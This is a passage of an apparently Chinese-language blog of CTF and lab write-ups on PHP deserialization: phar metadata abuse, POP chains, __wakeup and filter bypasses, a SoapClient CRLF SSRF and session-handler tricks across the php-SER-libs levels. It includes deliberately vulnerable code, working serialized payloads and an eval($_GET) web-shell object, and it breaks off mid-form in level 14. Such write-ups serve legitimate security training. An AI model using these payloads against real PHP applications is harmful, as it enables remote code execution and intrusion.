alt="image-20240423160332991"></p><h2 id="phpar"><a href="#phpar" class="headerlink" title="phpar"></a>phpar</h2><p><img src="/../image/image-20240423160538802.png" alt="image-20240423160538802"></p><p><img src="/../image/image-20240423160548405.png" alt="image-20240423160548405"></p><p><img src="/../image/image-20240423160756154.png" alt="image-20240423160756154"></p><p><img src="/../image/image-20240423160805460.png" alt="image-20240423160805460"></p><p><img src="/../image/image-20240423160937600.png" alt="image-20240423160937600"></p><p><img src="/../image/image-20240423160957547.png" alt="image-20240423160957547"></p><pre><code class="php">&lt;?php    //漏洞页面highlight_file(__FILE__);error_reporting(0);class Testobj&#123;    var $output=&quot;echo &#39;ok&#39;;&quot;;    function __destruct()    &#123;        eval($this-&gt;output);    &#125;&#125;if(isset($_GET[&#39;filename&#39;]))&#123;    $filename=$_GET[&#39;filename&#39;];    var_dump(file_exists($filename));&#125;?&gt;</code></pre><pre><code class="php">&lt;?phphighlight_file(__FILE__);class Testobj&#123;    var $output=&#39;&#39;;&#125;@unlink(&#39;test.phar&#39;);   //删除之前的test.par文件(如果有)$phar=new Phar(&#39;test.phar&#39;);  //创建一个phar对象，文件名必须以phar为后缀$phar-&gt;startBuffering();  //开始写文件$phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;);  //写入stub$o=new Testobj();$o-&gt;output=&#39;eval($_GET[&quot;a&quot;]);&#39;;$phar-&gt;setMetadata($o);//写入meta-data$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);  //添加要压缩的文件$phar-&gt;stopBuffering();?&gt;</code></pre><p><img src="/../image/image-20240423161535651.png" alt="image-20240423161535651"></p><p>例题</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);class TestObject &#123;    public function __destruct() &#123;        include(&#39;flag.php&#39;);        echo $flag;    &#125;&#125;$filename = $_POST[&#39;file&#39;];if (isset($filename))&#123;    echo md5_file($filename);&#125;//upload.php?&gt;</code></pre><p><img src="/../image/image-20240423162054135.png" alt="image-20240423162054135"></p><p><img src="/../image/image-20240423162144291.png" alt="image-20240423162144291"></p><p><img src="/../image/image-20240423162203703.png" alt="image-20240423162203703"></p><p><img src="/../image/image-20240423162215775.png" alt="image-20240423162215775"></p><p>记得把php,ini里的phar_readonly关了</p><p><img src="/../image/image-20240423162652131.png" alt="image-20240423162652131"><img src="/../image/image-20240423162829554.png" alt="image-20240423162829554"></p><p><img src="/../image/image-20240423163005142.png" alt="image-20240423163005142"></p><p><img src="/../image/image-20240423163017481.png" alt="image-20240423163017481"></p><h3 id="mylove"><a href="#mylove" class="headerlink" title="mylove"></a>mylove</h3><pre><code class="php">&lt;?phpclass a&#123;    //当访问 a 对象中不存在的属性时，该方法会调用 b 对象的 love 方法。    public function __get($a)&#123;        $this-&gt;b-&gt;love();    &#125;&#125;class b&#123;    //__destruct 方法在对象销毁时自动调用    public function __destruct()&#123;        $tmp = $this-&gt;c-&gt;name;    &#125;    //__wakeup 方法在对象被反序列化后自动调用    public function __wakeup()&#123;        $this-&gt;c = &quot;no!&quot;;        $this-&gt;b = $this-&gt;a;    &#125;&#125;class xk&#123;    public function love()&#123;        $a = $this-&gt;mylove;    &#125;    public function __get($a)&#123;        if(preg_match(&quot;/\.|\.php/&quot;,$this-&gt;man))&#123;            die(&quot;文件名不能有.&quot;);        &#125;        //将解码后的 $woman 内容写入文件，文件名由 $man 决定。        file_put_contents($this-&gt;man,base64_decode($this-&gt;woman));    &#125;&#125;class end&#123;    public function love()&#123;        ($this-&gt;func)();    &#125;&#125;if(isset($_GET[&#39;pop&#39;]))&#123;    unserialize($_GET[&#39;pop&#39;]);    if(preg_match(&quot;/N$/&quot;,$_GET[&#39;test&#39;]))&#123;        $tmp = $_GET[&#39;test&#39;];    &#125;    &#125;else&#123;    show_source(__FILE__);    phpinfo();&#125;if($$tmp[&#39;name&#39;]==&#39;your are good!&#39;)&#123;    echo &#39;ok!&#39;;    system($_GET[&#39;shell&#39;]);&#125;</code></pre><h1 id="php-SER-libs"><a href="#php-SER-libs" class="headerlink" title="php-SER-libs"></a><strong><a href="https://github.com/fine-1/php-SER-libs">php-SER-libs</a></strong></h1><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><table><thead><tr><th>关卡</th><th>不适用其他版本的原因以及相关设置</th></tr></thead><tbody><tr><td>level4 create_fucntion与可变函数调用</td><td>5.6不支持可变函数，7.2已废除create_function</td></tr><tr><td>level5 序列化格式过滤与CVE-2016-7124</td><td>CVE-2016-7124漏洞影响版本：PHP5 &lt; 5.6.25，PHP7 &lt; 7.0.10</td></tr><tr><td>level6 私有属性反序列化</td><td>escaped binary string(仅从php6开始支持)</td></tr><tr><td>level7 __call与属性的初始值</td><td>同上</td></tr><tr><td>level10 just_one_soap</td><td>需要开启soap扩展(php5.6：extension&#x3D;php_soap)</td></tr><tr><td>level11 a phar 和 level12 a phar trick</td><td>php.ini中phar.readonly&#x3D;Off（若有分号则去掉）</td></tr><tr><td>level13 引用和session</td><td>session.auto_start&#x3D;0; session.serialize_handler &#x3D; php;（level13均为默认设置）</td></tr><tr><td>leve14 session.upload_progress</td><td>session.auto_start&#x3D;0; session.serialize_handler &#x3D; php_serialize; session.upload_progress.enabled &#x3D; On; session.upload_progress.cleanup &#x3D; Off; session.upload_progress.prefix &#x3D; “upload_progress_”; session.upload_progress.name &#x3D; “PHP_SESSION_UPLOAD_PROGRESS”; session.upload_progress.freq &#x3D; “1%”; session.upload_progress.min_freq &#x3D; “1”;</td></tr></tbody></table><h2 id="level1-类的实例化"><a href="#level1-类的实例化" class="headerlink" title="level1 类的实例化"></a>level1 <strong>类的实例化</strong></h2><pre><code class="php">&lt;?phphighlight_file(__FILE__);header(&#39;Content-type:text/html;charset=utf-8&#39;);class a&#123;    var $act;    function action()&#123;        eval($this-&gt;act);    &#125;&#125;$a=unserialize($_GET[&#39;flag&#39;]);$a-&gt;action();?&gt;    #O:1:&quot;a&quot;:1:&#123;s:3:&quot;var&quot;;N;&#125;</code></pre><p>直接构造就行</p><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><pre><code class="php">&lt;?phphighlight_file(__FILE__);header(&#39;Content-type:text/html;charset=utf-8&#39;);include(&quot;flag.php&quot;);class mylogin&#123;    var $user;    var $pass;    function __construct($user,$pass)&#123;        $this-&gt;user=$user;        $this-&gt;pass=$pass;    &#125;    function login()&#123;        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;            return 1;        &#125;    &#125;&#125;$a=unserialize($_GET[&#39;param&#39;]);if($a-&gt;login())&#123;    echo $flag;&#125;?&gt; &lt;br&gt;&lt;a href=&quot;../level3&quot;&gt;点击进入第三关&lt;/a&gt;</code></pre><p>关键是要两个成员的值和判断条件一致,而调用construct方法，则需要序列化</p><pre><code class="php">&lt;?phpclass mylogin&#123;    var $user=&quot;daydream&quot;;    var $pass=&quot;ok&quot;;&#125;echo serialize(new mylogin());?&gt;    #O:7:&quot;mylogin&quot;:2:&#123;s:4:&quot;user&quot;;s:8:&quot;daydream&quot;;s:4:&quot;pass&quot;;s:2:&quot;ok&quot;;&#125;</code></pre><p><img src="/../image/image-20240423163756568.png" alt="image-20240423163756568"></p><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a><strong>level3</strong></h2><pre><code class="php">&lt;?phphighlight_file(__FILE__);header(&#39;Content-type:text/html;charset=utf-8&#39;);include(&quot;flag.php&quot;);class mylogin&#123;    var $user;    var $pass;    function __construct($user,$pass)&#123;        $this-&gt;user=$user;        $this-&gt;pass=$pass;    &#125;    function login()&#123;        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;            return 1;        &#125;    &#125;&#125;$a=unserialize($_COOKIE[&#39;param&#39;]);if($a-&gt;login())&#123;    echo $flag;&#125;?&gt; &lt;br&gt;&lt;a href=&quot;../level4&quot;&gt;点击进入第四关&lt;/a&gt;</code></pre><p>分析:这里和上一题差不多，就是要从cookie中读取反序列化的值，搜了下，加上url编码即可，但好像只能本地用，</p><p><img src="/../image/image-20240423171111860.png" alt="image-20240423171111860"></p><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>本关涉及到create_fucntion方法要变换php版本，可以使用–php 7. 0.9</p><pre><code class="php">&lt;?php highlight_file(__FILE__);header(&#39;Content-type:text/html;charset=utf-8&#39;);class func&#123;        public $key;        public function __destruct()        &#123;                        unserialize($this-&gt;key);        &#125; &#125;class GetFlag&#123;       public $code;        public $action;        public function get_flag()&#123;            $a=$this-&gt;action;            $a(&#39;&#39;, $this-&gt;code);        &#125;&#125;unserialize($_GET[&#39;param&#39;]);?&gt;&lt;br&gt;&lt;a href=&quot;../level5&quot;&gt;点击进入第五关&lt;/a&gt;</code></pre><p>这里还用到一个php特性——Array</p><p>当array内包裹的第一个值是对象，第二个是对象内的方法时</p><p>在反序列化后会调用该对象的方法</p><p><img src="/../image/image-20240423182048184.png" alt="image-20240423182048184"></p><p>所以就可以利用这个特性调用到getflag这个方法，至于如何读取到flag就要用到前面说的create_fucntion,但不懂为什么不会弹回flag，应该是版本问题</p><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a><strong>level5</strong></h2><pre><code class="php">&lt;?php    class secret&#123;        var $file=&#39;index.php&#39;;        public function __construct($file)&#123;            $this-&gt;file=$file;        &#125;        function __destruct()&#123;            include_once($this-&gt;file);            echo $flag;        &#125;        function __wakeup()&#123;            $this-&gt;file=&#39;index.php&#39;;        &#125;    &#125;    $cmd=$_GET[&#39;cmd&#39;];    if (!isset($cmd))&#123;        echo show_source(&#39;index.php&#39;,true);    &#125;    else&#123;        if (preg_match(&#39;/[oc]:\d+:/i&#39;,$cmd))&#123;            echo &quot;Are you daydreaming?&quot;;        &#125;        else&#123;            unserialize($cmd);        &#125;    &#125;    //sercet in flag.php?&gt;&lt;br&gt;&lt;a href=&quot;../level6&quot;&gt;点击进入第六关&lt;/a&gt;</code></pre><p><strong>wakeup绕过，正则表达式绕过</strong></p><pre><code class="php">&lt;?php    class secret&#123;        var $file=&#39;flag.php&#39;;&#125;echo serialize(new secret());#O:6:&quot;secret&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;#绕过正则，在6前面添个+号，绕过wakeup，把1改成2，成员数量不一致即可#修改后：O:+6:&quot;secret&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></pre><p><img src="/../image/image-20240423224017009.png" alt="image-20240423224017009"></p><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><pre><code class="php">&lt;?phphighlight_file(__FILE__);class secret&#123;    private $comm;    public function __construct($com)&#123;        $this-&gt;comm = $com;    &#125;    function __destruct()&#123;        echo eval($this-&gt;comm);    &#125;&#125;$param=$_GET[&#39;param&#39;];$param=str_replace(&quot;%&quot;,&quot;daydream&quot;,$param);unserialize($param);?&gt;&lt;br&gt;&lt;a href=&quot;../level7&quot;&gt;点击进入第七关&lt;/a&gt;s</code></pre><p> 本关对输入的param进行了一个%的过滤，而且类中的属性的变量是私有属性</p><p><strong>private属性序列化的时候格式是 %00类名%00成员名</strong></p><p><strong>payload</strong></p><pre><code class="php">&lt;?phpclass secret&#123;    private $comm;    public function __construct($com)    &#123;        $this-&gt;comm = $com;    &#125;    function __destruct()    &#123;        echo eval($this-&gt;comm);    &#125;&#125;$pa = new secret(&quot;system(&#39;sort flag.php&#39;);&quot;);#O:6:&quot;secret&quot;:1:&#123;s:12:&quot;%00secret%00comm&quot;;s:24:&quot;system(&#39;sort flag.php&#39;);&quot;;&#125;echo serialize($pa), &quot;\n&quot;;</code></pre><p>但还是不行， 这里因为%00被url解码后是不可见字符，所以要在类名左右加上\00且要将上面的小写s改成S</p><p><strong>与小写”s”不同，大写”S”表示键名或属性名是区分大小写的。</strong></p><pre><code class="php">#O:6:&quot;secret&quot;:1:&#123;S:12:&quot;\00secret\00comm&quot;;s:24:&quot;system(&#39;sort flag.php&#39;);&quot;;&#125;</code></pre><p><img src="/../image/image-20240423230938596.png" alt="image-20240423230938596"></p><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><pre><code class="php">&lt;?phphighlight_file(__FILE__);class you&#123;    private $body;    private $pro=&#39;&#39;;    function __destruct()#反序列化时调用    &#123;        $project=$this-&gt;pro;        $this-&gt;body-&gt;$projecct();    &#125;&#125;class my&#123;    public $name;    function __call($func, $args)//调用不存在方法的时候，    &#123;        if ($func == &#39;yourname&#39; and $this-&gt;name == &#39;myname&#39;) &#123;            include(&#39;flag.php&#39;);            echo $flag;        &#125;    &#125;&#125;$a=$_GET[&#39;a&#39;];unserialize($a);?&gt; </code></pre><p>当调用不存在的方法时，会把不存在的方法名赋值给第一个参数，所以不存在的方法最好就是yourname,所以pro可以设置成yourname，而要调用不存在的方法，可以new一个my赋值给body，所以构造出来的代码是</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);class you&#123;    private $body = new my();    private $pro=&#39;yourname&#39;;&#125;class my&#123;    public $name = &#39;myname&#39;;&#125;$a = new you();#$a=$_GET[&#39;a&#39;];echo serialize($a);?&gt;</code></pre><p>但这样运行会报错，PHP不允许在类属性的声明中使用直接实例化的方式。</p><p>类属性的初始化必须使用常量或静态表达式，而不能使用函数调用或实例化操作。因此，将$body属性的初始化移动到类的构造函数中会解决这个问题。比如在serialize时会调用的construct方法</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);class you&#123;    private $body;    private $pro = &#39;yourname&#39;;    public function __construct()    &#123;        $this-&gt;body = new my();    &#125;&#125;class my&#123;    public $name = &#39;myname&#39;;&#125;$a = new you();echo serialize($a);//然后记得将私有属性的%00补上//O:3:&quot;you&quot;:2:&#123;s:9:&quot;%00you%00body&quot;;O:2:&quot;my&quot;:1:&#123;s:4:&quot;name&quot;;s:6:&quot;myname&quot;;&#125;s:8:&quot;%00you%00pro&quot;;s:8:&quot;yourname&quot;;&#125;?&gt;</code></pre><p><img src="/../image/image-20240424202419211.png" alt="image-20240424202419211"></p><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><pre><code class="php">&lt;?phphighlight_file(__FILE__);function filter($name)&#123;    $safe=array(&quot;flag&quot;,&quot;php&quot;);    $name=str_replace($safe,&quot;hack&quot;,$name);    return $name;&#125;class test&#123;    var $user;    var $pass=&#39;daydream&#39;;    function __construct($user)&#123;        $this-&gt;user=$user;    &#125;&#125;$param=$_GET[&#39;param&#39;];$profile=unserialize(filter($param));if ($profile-&gt;pass==&#39;escaping&#39;)&#123;    echo file_get_contents(&quot;flag.php&quot;);&#125;?&gt;</code></pre><p>字符串逃逸，重要的是让filter里的name&#x3D;&#x3D;escaping，test不用考虑，下面来看看要几个php把,先把需要的序列化字符串构造出来</p><pre><code class="php">&lt;?phpclass test&#123;    var $user = &quot;123&quot;;#这个随便打    var $pass = &quot;escaping&quot;;&#125;echo serialize(new test());//O:4:&quot;test&quot;:2:&#123;s:4:&quot;user&quot;;s:3:&quot;123&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;</code></pre><p>关键是要**s:4:”pass”;s:8:”escaping”;}**这一段，这时就要让吐出来的字符数为29个，加上前面的引号和冒号,而1个php转换成hack会吃掉一个字符，所以全部要29个php</p><pre><code class="php">#$user=&#39;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;&#39;</code></pre><p>最终代码</p><pre><code class="php">&lt;?phpclass test&#123;    var $user=&#39;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;&#39;;    var $pass = &quot;escaping&quot;;&#125;echo serialize(new test());#O:4:&quot;test&quot;:2:&#123;s:4:&quot;user&quot;;s:116:&quot;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;</code></pre><p><img src="/../image/image-20240424204156850.png" alt="image-20240424204156850"></p><h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a><strong>level9</strong></h2><pre><code class="php">&lt;?php//flag is in flag.phphighlight_file(__FILE__);class Modifier &#123;    private $var;    public function append($value)    &#123;        include($value);        echo $flag;    &#125;    //这个是格式方法错误导致被调用。    public function __invoke()&#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;class Show&#123;    public $source;    public $str;    //即把对象当成字符串 调用    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;    //unserialize() 会检查是否存在一个wakeup()方法    public function __wakeup()&#123;        echo $this-&gt;source;    &#125;&#125;class Test&#123;    public $p;    //序列化时调用    public function __construct()&#123;        $this-&gt;p = array();    &#125;    //调用的成员属性不存在    public function __get($key)&#123;        $function = $this-&gt;p;        return $function();    &#125;&#125;if(isset($_GET[&#39;pop&#39;]))&#123;    unserialize($_GET[&#39;pop&#39;]);&#125;?&gt;</code></pre><p>首先，要想页面返回flag，我们就要调用append方法，而append方法时通过invoke方法赋值，而invoke是通过错误格式方法来触发，这就要找能调用方法的地方，可以找到get，而能触发get的方法就要找到可以读取属性的地方，即toString，而触发toString的地方只有Show，所以show就是头</p><p>构造poc</p><pre><code class="php">&lt;?php    class Modifier&#123;    private $var = &#39;flag.php&#39;;    &#125;    class Show &#123;        public $source;        public $str;    &#125;    class Test &#123;        public $p;    &#125;#先从头开始$a = new Show();                                             $a-&gt;source = $a;//把对象当字符串调用$b = new Test();$a-&gt;source-&gt;str = $b;//source类中的str赋值为Test类,当调用该类中不存在的属性source时触发get$c = new Modifier();$b-&gt;p=$c;//把类赋值给方法触发invokeecho urlencode(serialize($a));//从头开始序列化?&gt;#O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A13%3A%22%00Modifier%00var%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D%7D        </code></pre><p><img src="/../image/image-20240424212028638.png" alt="image-20240424212028638"></p><h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p>本关需要开启soap拓展且php版本在5.6、找到配置文件 php-ini</p><p><img src="/../image/image-20240424214011774.png" alt="image-20240424214011774"></p><pre><code class="php">&lt;?phphighlight_file(__FILE__);$c = unserialize($_GET[&#39;param&#39;]);$c -&gt; daydream();/*In this topic,it is of course possible to pass parameters directly to flag.php, but it is not recommended to use this method to learn SOAP.flag.php$flag=&quot;*&quot;;$user=$_SERVER[&#39;HTTP_USER_AGENT&#39;];$pass = $_POST[&#39;pass&#39;];if(isset($pass) and isset($user))&#123;    if($pass==&#39;password&#39; and $user==&#39;admin&#39;)&#123;        file_put_contents(&#39;flag.txt&#39;,$flag);    &#125;    &#125;*/?&gt;</code></pre><p>前置知识;<a href="https://blog.csdn.net/solitudi/article/details/113588692">https://blog.csdn.net/solitudi/article/details/113588692</a></p><p>在给出的代码中，有一个名为flag.php的文件。这个文件的作用是根据一些条件将一个标志($flag)写入到flag.txt文件中。</p><p>下面是对代码的解释：</p><ol><li><p>首先，定义了一个变量$flag，其初始值为”*”，表示标志的内容。</p></li><li><p>接下来，通过$_SERVER[‘HTTP_USER_AGENT’]获取了用户的User-Agent信息，并将其赋值给变量$user。</p></li><li><p>然后，通过$_POST[‘pass’]获取了来自POST请求的pass参数的值，并将其赋值给变量$pass。</p></li><li><p>在if条件语句中，首先使用isset()函数检查$pass和$user是否都存在。</p></li><li><p>如果$pass的值等于”password”并且$user的值等于”admin”，则条件成立。</p></li><li><p>在条件成立的情况下，使用file_put_contents()函数将$flag的内容写入到名为flag.txt的文件中。</p></li></ol><p>综上所述，这段代码的逻辑是，当接收到POST请求中包含正确的密码(“password”)和用户代理信息(“admin”)时，将标志($flag)的内容写入到flag.txt文件中。这可以作为一个简单的身份验证和授权机制，只有在满足特定条件时才会写入标志文件。</p><p><img src="/../image/image-20240424212652149.png" alt="image-20240424212652149"></p><p>在后台返回一下falg.php的一些值看看，在从0-1看到了类似的题目,原生类的利用public SoapClient :: SoapClient(mixed $wsdl [，array $options ])<br>第一个参数是用来指明是否是wsdl模式，如果为<code>null</code>，那就是非wsdl模式。<br>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。 </p><p> 还要利用crlf注入漏洞(\r\n)</p><pre><code class="php">&lt;?php$post_data=&#39;pass=password&#39;;$data_len=strlen($post_data);$a = new SoapClient(null,array(&#39;http://192.168.199.177:8080&#39;=&gt;&#39;http://192.168.174.143/ser/level10/flag.php&#39;,&#39;user_agent&#39;=&gt;&#39;admin^^Content-Type: application/x-www-form-urlencoded^^Content-Length: &#39;.$data_len.&#39;^^^^&#39;.$post_data,&#39;uri&#39;=&gt;&#39;bbba&#39;));$b = serialize($a);$b = str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$b);//将^^改为\r\n$b = str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$b);echo urlencode($b);#O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22bbba%22%3Bs%3A8%3A%22location%22%3Bs%3A43%3A%22http%3A%2F%2F192.168.174.143%2Fser%2Flevel10%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A91%3A%22admin%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A+13%0D%0A%0D%0Apass%3Dpassword%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</code></pre><p>然后直接访问目录下的txt文件即可</p><p><img src="/../image/image-20240425145934461.png" alt="image-20240425145934461"></p><p><img src="/../image/image-20240425145942258.png" alt="image-20240425145942258"></p><h2 id="level11phar反序列化"><a href="#level11phar反序列化" class="headerlink" title="level11phar反序列化"></a>level11phar反序列化</h2><pre><code class="php">&lt;?phphighlight_file(__FILE__);class TestObject &#123;    public function __destruct() &#123;        include(&#39;flag.php&#39;);        echo $flag;    &#125;&#125;$filename = $_POST[&#39;file&#39;];if (isset($filename))&#123;    echo md5_file($filename);&#125;//upload.php?&gt;</code></pre><p>可以先试一下看看常见的文件存不存在</p><p><img src="/../image/image-20240425161340203.png" alt="image-20240425161340203"></p><p>目的是echo $flag，然后destruct是要反序列化时才会触发的方法，所以通过md5_file去触发反序列化，由此构造</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);class TestObject&#123;&#125;@unlink(&#39;test.phar&#39;);   //删除之前的test.par文件(如果有)$phar=new Phar(&#39;test.phar&#39;);  //创建一个phar对象，文件名必须以phar为后缀$phar-&gt;startBuffering();  //开始写文件$phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;);  //写入stub$o=new TestObject();$phar-&gt;setMetadata($o);//写入meta-data$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);  //添加要压缩的文件$phar-&gt;stopBuffering();?&gt;</code></pre><p>然后将生成的文件改成图片类型的后缀上传，然后POST参数附上就可以了</p><p><img src="/../image/image-20240425163542221.png" alt="image-20240425163542221"></p><h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><pre><code class="php">&lt;?phphighlight_file(__FILE__);class TestObject &#123;    public function __destruct() &#123;        include(&#39;flag.php&#39;);        echo $flag;    &#125;&#125;$filename = $_POST[&#39;file&#39;];$boo1=1;$black_list=[&#39;php&#39;,&#39;file&#39;,&#39;glob&#39;,&#39;data&#39;,&#39;http&#39;,&#39;ftp&#39;,&#39;zip&#39;,&#39;https&#39;,&#39;ftps&#39;,&#39;phar&#39;];foreach($black_list as $item)&#123;    $front=substr($filename,0,strlen($item));    if ($front==$item)&#123;        $boo1=0;    &#125;&#125;if (isset($filename) and $boo1)&#123;    echo md5_file($filename);&#125;//upload.php?&gt;</code></pre><p>正常的phar伪协议是不行的</p><p>当phar被过滤的情况下可以使用下列协议实现绕过</p><pre><code>compress.bzip://phar:///test.phar/test.txtcompress.bzip2://phar:///test.phar/test.txtcompress.zlib://phar:///home/sx/test.phar/test.txtphp://filter/resource=phar:///test.phar/test.txt</code></pre><p><img src="/../image/image-20240425183148519.png" alt="image-20240425183148519"></p><p> 由于黑名单上有zip和php所以使用的payload为:</p><blockquote><p>compress.zlib:&#x2F;&#x2F;phar:&#x2F;&#x2F;upload&#x2F;test.gif&#x2F;test.txt</p></blockquote><p><img src="/../image/image-20240425193124264.png" alt="image-20240425193124264"></p><h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><pre><code class="php">&lt;?phphighlight_file(__FILE__);/*hint.php*/session_start();class Flag&#123;    public $name;    public $her;    function __wakeup()&#123;        $this-&gt;name=$this-&gt;her=md5(rand(1, 10000));        if ($this-&gt;name===$this-&gt;her)&#123;            //绕过这个需要用到引用            include(&#39;flag.php&#39;);            echo $flag;        &#125;    &#125;&#125;?&gt;</code></pre><p>先去hint.php看看线索</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);//#ini_set设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。 设置选择session序列化选择器session_start();$_SESSION[&#39;a&#39;] = $_GET[&#39;a&#39;];?&gt;</code></pre><p>在index.php中就一个Flag类中存在一个__wakeup魔术方法</p><p>方法内形同虚设，相当于触发了方法直接返回flag</p><p>哪触发wakeup需要反序列化，这里没unserialize函数且没有文件上传</p><p>但hint中发现对session是可控的且在hint.php下session的引擎格式是php_serialize</p><p>默认情况下session处理引擎是php</p><p>此外了解一下ini_set这个函数</p><p>ini_set设置php.ini指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。</p><p> 也就是说只有在hint.php下时是对session处理的引擎是php_serialize</p><p>其他php文件下还是默认php引擎</p><p>php引擎的存储格式是键名|serialized_string，而php_serialize引擎的存储格式是serialized_string</p><p>当在php_serialize的引擎储存格式下创建session然后处理(验证)session时会把”  |  “当成一个正常的字符。而在php引擎储存格式下处理(验证)同一个session的时会把”  |  “ 当成键与值的分割符然后对分割符后面的值进行反序列化</p><p>所以当我们在自定义session中在序列化语句前加上  |  然后再访问index.php这时，在index.php下服务器验证session的时候因为是php引擎储存格式，所以会对session中  |  后的内容进行反序列化，从而触发了wakeup魔术方法得到flag</p><pre><code class="php">&lt;?php#highlight_file(__FILE__);/*hint.php*/session_start();class Flag&#123;    public $name;    public $her;    function __wakeup()&#123;        $this-&gt;name=$this-&gt;her=md5(rand(1, 10000));        if ($this-&gt;name===$this-&gt;her)&#123;            //绕过这个需要用到引用            include(&#39;flag.php&#39;);            echo $flag;        &#125;    &#125;&#125;$a = new Flag();$a-&gt;name = &amp;$a-&gt;her;echo serialize($a);?&gt;#O:4:&quot;Flag&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;her&quot;;R:2;&#125;#?a=|O:4:&quot;Flag&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;her&quot;;R:2;&#125;</code></pre><p><img src="/../image/image-20240425203402758.png" alt="image-20240425203402758"></p><h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><p>php.ini配置</p><pre><code class="ini">session.auto_start=0;session.serialize_handler = php_serialize;session.upload_progress.enabled = On;session.upload_progress.cleanup = Off;session.upload_progress.prefix = &quot;upload_progress_&quot;;session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;;&lt;br&gt;session.upload_progress.freq =  &quot;1%&quot;;session.upload_progress.min_freq = &quot;1&quot;;</code></pre><pre><code class="php">&lt;?phphighlight_file(__FILE__);ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);session_start();class test&#123;    public $name;    function __destruct()&#123;        if($this-&gt;name==&#39;flag&#39;)&#123;            include(&#39;flag.php&#39;);            echo $flag;        &#125;        else&#123;            phpinfo();        &#125;    &#125;&#125;</code></pre><pre><code>O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:4:&quot;flag&quot;;&#125;</code></pre><p>主要利用的是session.upload_progress.enabled 当该设置为on 的时候，在向服务器上传任意一个文件的时候php会把该上传文件的详细信息(如上传时间，文件名等)储存在session中，而当我们以POST形式传入名为PHP_SESSION_UPLOAD_PROGRESS的变量时，传入的文件名会被储存到session中(也是filename的值赋值到session中)</p><p>原文链接：<a href="https://blog.csdn.net/qq_73767109/article/details/130856442">https://blog.csdn.net/qq_73767109/article/details/130856442</a></p><p><strong>.写一个文件上传的html</strong></p><pre><code class="html">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;&lt;form id=&quot;upload-form&quot; action=&quot;http://192.168.174.143/ser/level14/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;        &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;test&quot;/&gt;        上传文件…        &lt;input name=&quot;file1&quot; type=&quot;file&quot; /&gt;        &lt;input type=&quot;submit&quot; value=&quot;上传&quot;/&gt;    